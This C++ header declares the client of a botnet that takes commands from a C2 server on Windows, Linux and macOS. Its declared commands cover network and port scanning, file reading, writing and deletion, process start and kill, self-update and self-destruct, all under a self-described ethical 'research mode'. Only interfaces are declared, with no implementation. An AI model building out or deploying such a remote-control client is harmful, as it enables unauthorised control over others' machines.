#pragma once

#include <functional>
#include <map>
#include <string>
#include <vector>
#include <memory>
#include <mutex>
#include <chrono>
#include <nlohmann/json.hpp>
#include "../../../common/protocol/message.h"
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace commands {

/**
 * @brief Cross-platform command processor - single codebase approach
 * 
 * Executes commands from C2 server on Windows, Linux, and macOS.
 * Research mode enforces ethical constraints and comprehensive logging.
 */
class CommandProcessor {
public:
    enum class CommandCategory {
        SYSTEM_INFO,        // System information gathering
        NETWORK_OPERATIONS, // Network scanning and operations
        FILE_OPERATIONS,    // File system operations
        PROCESS_OPERATIONS, // Process management
        RESEARCH_COMMANDS,  // Research-specific commands
        ADMINISTRATIVE,     // Bot administration
        EMERGENCY          // Emergency and safety commands
    };

    enum class ExecutionResult {
        SUCCESS,
        FAILED,
        BLOCKED_BY_ETHICS,
        REQUIRES_APPROVAL,
        TIMEOUT,
        INVALID_PARAMETERS,
        PERMISSION_DENIED,
        NOT_SUPPORTED,
        EMERGENCY_STOP_TRIGGERED
    };

    struct CommandInfo {
        std::string name;
        std::string description;
        CommandCategory category;
        bool requires_admin;
        bool research_approved;
        std::vector<std::string> parameters;
        std::chrono::seconds default_timeout;
        bool platform_specific;
        std::vector<std::string> supported_platforms;
    };

    struct ExecutionContext {
        std::string command_name;
        nlohmann::json parameters;
        std::string correlation_id;
        std::chrono::system_clock::time_point started_at;
        std::chrono::seconds timeout;
        bool research_mode;
        std::string research_session_id;
        std::string approval_token;
    };

    struct ExecutionResponse {
        ExecutionResult result;
        nlohmann::json data;
        std::string error_message;
        std::chrono::milliseconds execution_time;
        std::vector<std::string> research_logs;
        bool ethical_compliance_verified;
    };

    using CommandHandler = std::function<ExecutionResponse(const ExecutionContext&)>;

public:
    CommandProcessor();
    ~CommandProcessor();

    bool Initialize(bool research_mode = true);
    
    // Command execution
    ExecutionResponse ExecuteCommand(const protocol::CommandRequest& command);
    ExecutionResponse ExecuteCommand(const std::string& command_name, 
                                   const nlohmann::json& parameters,
                                   const std::string& correlation_id = "");
    
    // Command registration
    bool RegisterCommand(const std::string& command_name, 
                        CommandHandler handler,
                        const CommandInfo& info);
    bool UnregisterCommand(const std::string& command_name);
    
    // Command information
    std::vector<std::string> GetAvailableCommands() const;
    std::vector<std::string> GetResearchApprovedCommands() const;
    CommandInfo GetCommandInfo(const std::string& command_name) const;
    bool IsCommandSupported(const std::string& command_name) const;
    bool IsCommandResearchApproved(const std::string& command_name) const;
    
    // Research mode
    void EnableResearchMode(const std::string& session_id);
    void DisableResearchMode();
    bool IsResearchModeEnabled() const;
    void SetApprovedCommands(const std::vector<std::string>& commands);
    
    // Execution history and logging
    std::vector<ExecutionContext> GetExecutionHistory() const;
    std::vector<std::string> GetResearchLogs() const;
    void ClearExecutionHistory();

private:
    bool research_mode_;
    std::string research_session_id_;
    std::vector<std::string> approved_commands_;
    
    std::map<std::string, CommandHandler> command_handlers_;
    std::map<std::string, CommandInfo> command_info_;
    mutable std::mutex commands_mutex_;
    
    std::vector<ExecutionContext> execution_history_;
    std::vector<std::string> research_logs_;
    mutable std::mutex logs_mutex_;
    
    // Built-in command handlers
    void RegisterBuiltinCommands();
    
    // System information commands
    ExecutionResponse HandleSystemInfo(const ExecutionContext& context);
    ExecutionResponse HandlePlatformInfo(const ExecutionContext& context);
    ExecutionResponse HandleHardwareInfo(const ExecutionContext& context);
    ExecutionResponse HandleNetworkInfo(const ExecutionContext& context);
    ExecutionResponse HandleSoftwareInfo(const ExecutionContext& context);
    
    // Network commands
    ExecutionResponse HandleNetworkScan(const ExecutionContext& context);
    ExecutionResponse HandlePortScan(const ExecutionContext& context);
    ExecutionResponse HandleDNSLookup(const ExecutionContext& context);
    ExecutionResponse HandlePing(const ExecutionContext& context);
    ExecutionResponse HandleTraceRoute(const ExecutionContext& context);
    
    // File system commands
    ExecutionResponse HandleFileList(const ExecutionContext& context);
    ExecutionResponse HandleFileRead(const ExecutionContext& context);
    ExecutionResponse HandleFileWrite(const ExecutionContext& context);
    ExecutionResponse HandleFileDelete(const ExecutionContext& context);
    ExecutionResponse HandleFileSearch(const ExecutionContext& context);
    
    // Process commands
    ExecutionResponse HandleProcessList(const ExecutionContext& context);
    ExecutionResponse HandleProcessKill(const ExecutionContext& context);
    ExecutionResponse HandleProcessStart(const ExecutionContext& context);
    ExecutionResponse HandleProcessInfo(const ExecutionContext& context);
    
    // Research commands
    ExecutionResponse HandleResearchDataCollection(const ExecutionContext& context);
    ExecutionResponse HandleResearchLogging(const ExecutionContext& context);
    ExecutionResponse HandleResearchStatus(const ExecutionContext& context);
    ExecutionResponse HandleEnvironmentAnalysis(const ExecutionContext& context);
    
    // Administrative commands
    ExecutionResponse HandleConfigUpdate(const ExecutionContext& context);
    ExecutionResponse HandleSelfUpdate(const ExecutionContext& context);
    ExecutionResponse HandleHealthCheck(const ExecutionContext& context);
    ExecutionResponse HandleStatistics(const ExecutionContext& context);
    
    // Emergency commands
    ExecutionResponse HandleEmergencyStop(const ExecutionContext& context);
    ExecutionResponse HandleSelfDestruct(const ExecutionContext& context);
    ExecutionResponse HandleShutdown(const ExecutionContext& context);
    
    // Validation and security
    bool ValidateCommand(const ExecutionContext& context);
    bool ValidateParameters(const std::string& command_name, const nlohmann::json& parameters);
    bool CheckEthicalCompliance(const std::string& command_name);
    bool CheckPermissions(const std::string& command_name);
    
    // Execution helpers
    ExecutionResponse ExecuteWithTimeout(const ExecutionContext& context, CommandHandler handler);
    void LogCommandExecution(const ExecutionContext& context, const ExecutionResponse& response);
    void LogResearchActivity(const std::string& activity);
    
    // Platform-specific implementations
    nlohmann::json GetWindowsSystemInfo();
    nlohmann::json GetLinuxSystemInfo();
    nlohmann::json GetMacOSSystemInfo();
    
    nlohmann::json GetWindowsProcessList();
    nlohmann::json GetLinuxProcessList();
    nlohmann::json GetMacOSProcessList();
    
    nlohmann::json GetWindowsNetworkInfo();
    nlohmann::json GetLinuxNetworkInfo();
    nlohmann::json GetMacOSNetworkInfo();
};

/**
 * @brief System information collector - cross-platform
 */
class SystemInfoCollector {
public:
    static nlohmann::json CollectBasicInfo();
    static nlohmann::json CollectHardwareInfo();
    static nlohmann::json CollectSoftwareInfo();
    static nlohmann::json CollectNetworkInfo();
    static nlohmann::json CollectSecurityInfo();
    
    // Research mode - comprehensive data collection
    static nlohmann::json CollectResearchInfo();
    static nlohmann::json CollectEnvironmentInfo();

private:
    static nlohmann::json CollectWindowsInfo();
    static nlohmann::json CollectLinuxInfo();
    static nlohmann::json CollectMacOSInfo();
    
    static std::vector<std::string> GetInstalledSoftware();
    static std::vector<std::string> GetRunningServices();
    static std::vector<std::string> GetNetworkAdapters();
    static std::vector<std::string> GetSecurityProducts();
};

/**
 * @brief Network operations handler - cross-platform
 */
class NetworkOperations {
public:
    static nlohmann::json ScanNetwork(const std::string& network_range);
    static nlohmann::json ScanPorts(const std::string& target, 
                                   const std::vector<uint16_t>& ports);
    static nlohmann::json DNSLookup(const std::string& hostname);
    static nlohmann::json Ping(const std::string& target, uint32_t count = 4);
    static nlohmann::json TraceRoute(const std::string& target);
    
    // Research mode - limited network operations
    static nlohmann::json ResearchNetworkScan(const std::string& target);
    static nlohmann::json SafePortScan(const std::string& target);

private:
    static nlohmann::json PingWindows(const std::string& target, uint32_t count);
    static nlohmann::json PingLinux(const std::string& target, uint32_t count);
    static nlohmann::json PingMacOS(const std::string& target, uint32_t count);
    
    static nlohmann::json TraceRouteWindows(const std::string& target);
    static nlohmann::json TraceRouteLinux(const std::string& target);
    static nlohmann::json TraceRouteMacOS(const std::string& target);
    
    static bool IsTargetAllowed(const std::string& target);
    static bool IsPrivateNetwork(const std::string& ip);
};

/**
 * @brief File system operations - cross-platform
 */
class FileSystemOperations {
public:
    static nlohmann::json ListDirectory(const std::string& path, bool recursive = false);
    static nlohmann::json ReadFile(const std::string& path, size_t max_size = 1024 * 1024);
    static nlohmann::json WriteFile(const std::string& path, const std::string& content);
    static nlohmann::json DeleteFile(const std::string& path);
    static nlohmann::json SearchFiles(const std::string& directory, 
                                     const std::string& pattern);
    static nlohmann::json GetFileInfo(const std::string& path);
    
    // Research mode - safe file operations
    static nlohmann::json SafeFileOperations(const std::string& operation,
                                            const nlohmann::json& parameters);

private:
    static bool IsPathSafe(const std::string& path);
    static bool IsFileAccessAllowed(const std::string& path);
    static std::vector<std::string> GetSafePaths();
    static std::vector<std::string> GetBlockedPaths();
    
    static nlohmann::json ListDirectoryWindows(const std::string& path);
    static nlohmann::json ListDirectoryLinux(const std::string& path);
    static nlohmann::json ListDirectoryMacOS(const std::string& path);
};

/**
 * @brief Process operations - cross-platform
 */
class ProcessOperations {
public:
    static nlohmann::json ListProcesses();
    static nlohmann::json GetProcessInfo(uint32_t process_id);
    static nlohmann::json KillProcess(uint32_t process_id);
    static nlohmann::json StartProcess(const std::string& executable, 
                                      const std::vector<std::string>& arguments);
    
    // Research mode - limited process operations
    static nlohmann::json SafeProcessOperations(const std::string& operation,
                                               const nlohmann::json& parameters);

private:
    static nlohmann::json ListProcessesWindows();
    static nlohmann::json ListProcessesLinux();
    static nlohmann::json ListProcessesMacOS();
    
    static bool IsProcessOperationSafe(const std::string& operation, uint32_t process_id);
    static bool IsExecutableAllowed(const std::string& executable);
    static std::vector<std::string> GetBlockedProcesses();
};

/**
 * @brief Research command handlers
 */
class ResearchCommands {
public:
    static nlohmann::json CollectResearchData(const std::string& session_id);
    static nlohmann::json LogResearchEvent(const std::string& event_type,
                                          const nlohmann::json& event_data);
    static nlohmann::json GetResearchStatus();
    static nlohmann::json AnalyzeEnvironment();
    static nlohmann::json GenerateResearchReport();
    
    // Ethical compliance
    static nlohmann::json ValidateEthicalCompliance(const std::string& operation);
    static nlohmann::json ReportComplianceViolation(const std::string& violation_type);

private:
    static nlohmann::json CollectSystemMetrics();
    static nlohmann::json CollectNetworkMetrics();
    static nlohmann::json CollectSecurityMetrics();
    static nlohmann::json AnalyzeVirtualizationEnvironment();
    
    static void LogToResearchDatabase(const nlohmann::json& data);
    static std::string GenerateResearchFingerprint();
};

/**
 * @brief Command validator for ethical and security constraints
 */
class CommandValidator {
public:
    struct ValidationResult {
        bool allowed;
        std::string reason;
        std::vector<std::string> warnings;
        std::vector<std::string> required_permissions;
        bool requires_research_approval;
    };

public:
    static ValidationResult ValidateCommand(const std::string& command_name,
                                          const nlohmann::json& parameters,
                                          bool research_mode);
    
    static bool IsCommandEthicallyApproved(const std::string& command_name);
    static bool IsParameterSafe(const std::string& parameter_name, const nlohmann::json& value);
    static bool CheckSecurityConstraints(const std::string& command_name);
    
    // Research mode validation
    static ValidationResult ValidateResearchCommand(const std::string& command_name,
                                                   const nlohmann::json& parameters);
    static bool IsResearchCompliant(const std::string& command_name);

private:
    static const std::vector<std::string> APPROVED_COMMANDS;
    static const std::vector<std::string> BLOCKED_COMMANDS;
    static const std::vector<std::string> RESEARCH_ONLY_COMMANDS;
    
    static bool CheckParameterTypes(const std::string& command_name, 
                                  const nlohmann::json& parameters);
    static bool ValidateFilePaths(const nlohmann::json& parameters);
    static bool ValidateNetworkTargets(const nlohmann::json& parameters);
    static bool CheckResourceLimits(const std::string& command_name);
};

/**
 * @brief Command execution monitor for safety and compliance
 */
class ExecutionMonitor {
public:
    struct ExecutionMetrics {
        std::chrono::system_clock::time_point start_time;
        std::chrono::system_clock::time_point end_time;
        std::chrono::milliseconds duration;
        std::string command_name;
        ExecutionResult result;
        size_t memory_used;
        double cpu_used;
        bool compliance_verified;
    };

public:
    ExecutionMonitor();
    ~ExecutionMonitor();

    void StartMonitoring(const std::string& command_name, const std::string& correlation_id);
    void StopMonitoring(const std::string& correlation_id, ExecutionResult result);
    
    ExecutionMetrics GetMetrics(const std::string& correlation_id) const;
    std::vector<ExecutionMetrics> GetAllMetrics() const;
    
    // Safety monitoring
    bool CheckResourceUsage(const std::string& correlation_id);
    bool CheckExecutionTime(const std::string& correlation_id, std::chrono::seconds max_time);
    void TriggerEmergencyStop(const std::string& reason);

private:
    std::map<std::string, ExecutionMetrics> active_executions_;
    std::vector<ExecutionMetrics> completed_executions_;
    mutable std::mutex metrics_mutex_;
    
    void CollectResourceMetrics(ExecutionMetrics& metrics);
    bool IsResourceUsageExcessive(const ExecutionMetrics& metrics);
    void LogExecutionMetrics(const ExecutionMetrics& metrics);
};

} // namespace commands
} // namespace client
} // namespace botnet
